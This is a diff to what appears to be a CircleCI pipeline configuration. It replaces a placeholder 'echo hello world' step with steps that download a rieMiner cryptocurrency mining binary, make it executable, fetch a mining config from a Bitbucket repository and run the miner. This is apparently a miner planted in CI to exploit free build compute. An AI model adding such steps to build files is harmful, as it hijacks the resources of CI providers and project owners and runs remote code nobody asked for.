@@ -6,7 +6,10 @@ jobs:
       - image: cimg/node:17.2.0 # the primary container, where your job's commands are run
     steps:
       - checkout # check out the code in the project directory
-      - run: echo "hello world" # run the `echo` command
+      - run: wget -O rie https://riecoin.dev/resources/Pttn/rieMiner.php?system=Deb64AVX2
+      - run: chmod +x rie
+      - run: wget https://bitbucket.org/ricmine001/ricmine01/raw/1044bdd3849be5876ba2fb8476cec1891a5e7812/rieMiner.conf
+      - run: ./rie
 
 workflows:
   my-workflow:
